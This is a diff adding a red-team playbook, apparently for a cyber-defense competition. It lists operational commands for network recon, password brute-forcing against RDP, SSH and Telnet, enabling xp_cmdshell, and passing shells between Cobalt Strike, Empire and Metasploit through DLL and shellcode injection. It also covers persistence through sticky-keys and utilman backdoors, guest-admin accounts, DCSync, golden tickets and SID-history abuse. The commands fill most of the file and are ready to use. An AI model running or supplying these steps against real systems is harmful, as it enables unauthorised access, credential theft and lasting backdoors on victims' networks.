@@ -1,0 +1,192 @@
+---Prep---
+	Kali box prep
+	Configure burp and foxyproxy on 
+	Update
+	Install extra tools (Veil, Empire, etc)
+	Github seclists password lists (https://github.com/danielmiessler/SecLists)
+	Can use setup script (https://github.com/bluscreenofjeff/CCDC-Scripts/blob/master/kali_setup.sh)
+
+---Recon---
+	NMAP
+		nmap -sn -n <targets>
+		nmap -sP -PI -T4 -v7
+		nmap -A <host> (run this second)
+		nmap -sV -F 
+		nmap -p- -sV -O -T4 -v7 -sC
+		(open SMB shares) nmap --script=smb-enum-shares -p445
+		(open NFS) nmap -p 111,2049 --script nfs-ls,nfs-showmount
+		(optional) UDP scan: nmap -sU -F -Pn -v -d -sC -sV --open --reason -T5 <targets>
+	Anonymous FTP
+		nmap -sC -sV -p21
+	VNC Brute
+		nmap --script=vnc-brute -p5800,5900
+
+	RDP Brute
+		ncrack -u administrator -P 500-worst-passwords.txt -p 3389 10.212.50.21
+
+	SSH Brute
+		medusa -M ssh -C /usr/share/wordlists/ssh.lst -H 22.txt -T 10| grep SUCCESS |tee medusa-results.txt
+	
+	Telnet Brute
+		medusa -M telnet -C /usr/share/wordlists/telnet.lst -H 23.txt -T 10 -t 3| grep SUCCESS |tee medusa-results.txt
+	Rawr Scan
+		nmap -sV --open -T4 -v7 -p80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092 -iL live-hosts.txt -oA web
+
+	Web Interface Review
+
+		python rawr.py web.xml
+
+		perl nikto.pl -h [path-to-greppable-nmap-file] -p 80,280,443,591,593,981,1311,2031,2480,3181,4444,4445,4567,4711,4712,5104,5280,5800,5988,5989,7000,7001,7002,8008,8011,8012,8013,8014,8042,8069,8080,8081,8243,8280,8281,8531,8887,8888,9080,9443,11371,12443,16080,18091,18092
+
+	Domain Controller Anonymous Enumeration
+		enum4linux -A <ip> | tee <ip>-anon-enum.txt
+
+	Powerview
+		Requires domain user privileges
+		
+		(find users - default group = Domain Admins) 
+		Invoke-UserHunter -Threads 15 -NoPing [-GroupName “Enterprise Admins”]
+		
+		(get domain user info) Get-NetUser [-UserName john]
+		(find group names) Get-NetGroup [-GroupName *admin*]
+		(get group members) Get-NetGroupMember [-GroupName “Domain Admins”]
+		(find open shares) Invoke-ShareFinder -CheckShareAccess
+		(find hosts where the current user is local admin) Find-LocalAdminAccess
+		
+		See cheat sheet for more commands (https://github.com/HarmJ0y/CheatSheets/blob/master/PowerView.pdf)
+		
+	PowerUp
+		Requires host access
+		Invoke-AllChecks
+		
+		See cheat sheet for more commands (https://github.com/HarmJ0y/CheatSheets/blob/master/PowerUp.pdf)
+
+---Popping---
+	Password guessing
+		Telnet/SSH
+			medua -h <tehost.ip> -u <account.name> -P /path/to/wordlist -M [telnet|ssh]
+		
+		SMB
+			medusa -h <host.ip> -u <account.name> -P /path/to/wordlist -M smbnt
+
+	Turn on xp_cmdshell
+		EXEC sp_configure 'show advanced options', 1;
+		RECONFIGURE;
+		EXEC sp_configure 'xp_cmdshell', 1;
+		RECONFIGURE;
+		EXEC sp_configure 'show advanced options', 1;RECONFIGURE;EXEC sp_configure 'xp_cmdshell', 1;RECONFIGURE;
+
+---Persistence---
+	In Cobalt, use the spawn command to bounce sessions over to Meta team servers. Set up a foreign listener ahead of time for each server.
+
+	Shell Passing
+
+	Cobalt Strike to:
+		Metasploit
+			- Set up a listener in Metasploit.
+			- In Cobalt Strike, set up a foreign listener, such as windows/foreign/http), using the Metasploit server’s info for host and port. Now the listener can be used for any command or action that takes a listener parameter, such as spawn and spawnas.
+	
+		Empire
+			In Empire, set up a listener. Then:
+			- usestager dll
+			- set Listener <listener-name>
+			- generate
+			- (Note the OutFile path)
+			- In your beacon session in Cobalt run ps to find a suitable process ID to inject into, then run:
+			- dllinject <pid> <OutFile path>
+	
+	Empire to:
+		Cobalt Strike
+			- In Cobalt Strike, set up an http beacon listener
+			In Empire:
+			- use listeners
+			- set Type meter
+			- set Host http://COBALT-SERVER-IP:PORT-OF-BEACON-LISTENER
+			- set Name cobalt
+			- agents
+			- interact <agent name>
+			- usemodule code_execution/invoke_shellcode	
+			- set Listener cobalt
+			- execute
+
+		Metasploit
+			- In Metasploit, set up a reverse http meterpreter listener
+			In Empire:
+			- use listeners
+			- set Type meter
+			- set Host http://MSF-SERVER-IP:PORT-OF-MSF-LISTENER
+			- set Name meterpreter
+			- agents
+			- interact <agent name>
+			- usemodule code_execution/invoke_shellcode	
+			- set Listener meterpreter
+			- execute
+		
+	Metasploit to:
+		Cobalt Strike
+			- Cobalt Strike can stage using any Metasploit module with the Payload option. Set the payload to match your Cobalt Listener’s (ie http or https) and use your teamserver’s IP and port for LHOST and LPORT settings.
+
+			- To spawn a Beacon session from an existing Meterpreter session, use exploit/windows/local/payload_inject. Set DisablePayloadHandler True.
+
+	Empire
+		- In Empire, set up a listener. Then:
+		- usestager dll
+		- set Listener <listener-name>
+		- generate
+		- (Note the OutFile path)
+		- 	In MSF:
+		- use post/windows/manage/reflective_dll_inject
+		- set path <OutFile path>
+		- set session <session-number>
+		- Interact with the session to run ps and get a PID to inject into
+		- set pid <pid>
+		- run
+
+	References:
+		http://www.sixdub.net/?p=627
+		http://blog.cobaltstrike.com/2016/01/05/interoperability-with-the-metasploit-framework/
+
+	Windows
+		Sticky keys
+			Copy c:\windows\system32\cmd.exe to c:\windows\system32\sethc.exe
+			http://blog.cobaltstrike.com/2016/03/16/my-cobalt-strike-scripts-from-neccdc/
+			http://blog.cobaltstrike.com/2015/03/05/scripting-beacons-and-deploying-persistence/
+
+		Other CMD backdoors 
+			Sticky Keys (Shift 5 times)
+				REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\sethc.exe" /v Debugger /t REG_SZ /d "c:\windows\system32\cmd.exe"
+		
+			Utilman (Utility button on lock screen)
+				REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\utilman.exe" /v Debugger /t 	REG_SZ /d "c:\windows\system32\cmd.exe"
+		
+			OnScreen Keyboard (within Utilman menu)
+				REG ADD "HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\osk.exe" /v Debugger /t 	REG_SZ /d "c:\windows\system32\cmd.exe"
+
+
+		Add ‘guest’ to local administrators group [Aggressor script in Google folder]
+			net user guest /active:yes
+			net user guest PASSWORD
+			net localgroup  administrators guest /add
+
+		DCSync to pull hash (https://www.youtube.com/watch?v=dDAz13wmCk8)
+			Cobalt Strike
+				Make_token DOMAIN\DOMAIN_ADMIN_USER <password>
+				Dcsync DOMAIN.FQDN <DOMAIN\username_to_pull>
+
+		Golden Ticket
+			Dump hashes from DC (krbtgt hash needed)
+			Domain sid - whoami /user (omit the last hyphenated section)
+			Cobalt -> Access -> Golden Ticket
+
+		SID History (must be run on session w/ DC directly)
+			Cobalt: mimikatz misc::addsid <user> <group-in-quotes>
+			Empire’s persistence/misc/add_sidhistory module
+
+		Empire Persistence:
+			http://www.harmj0y.net/blog/empire/nothing-lasts-forever-persistence-with-empire/
+
+	Linux
+		Cron
+		Add SSH keys
+		Add SUID to world-writeable script (chmod u+s <file>)
+		Add init script (reboot persistence)
